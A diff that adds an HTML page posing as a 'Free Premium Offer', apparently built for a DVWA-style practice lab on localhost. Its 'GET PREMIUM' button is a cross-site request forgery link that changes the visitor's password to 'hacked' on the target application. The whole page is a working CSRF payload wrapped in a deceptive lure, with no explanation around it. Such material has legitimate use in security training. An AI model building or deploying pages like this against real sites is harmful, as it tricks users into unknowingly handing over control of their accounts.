@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Premium Offer</title>
+    <style>
+        body {background: #f0f0f0; margin: 0; padding: 20px;}
+        .container {background: white; padding: 30px; border-radius: 10px; margin: 50px auto; max-width: 500px;}
+        .btn {display: block; background: #ff4757; color: white; padding: 15px; text-decoration: none; border-radius: 5px; margin: 20px 0;}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🎉 Exclusive Free Premium!</h2>
+        <p>Click below to claim your 1-year subscription:</p>
+        <a href="http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" class="btn">
+            GET PREMIUM
+        </a>
+        <small>*Limited time offer</small>
+    </div>
+</body>
+</html>
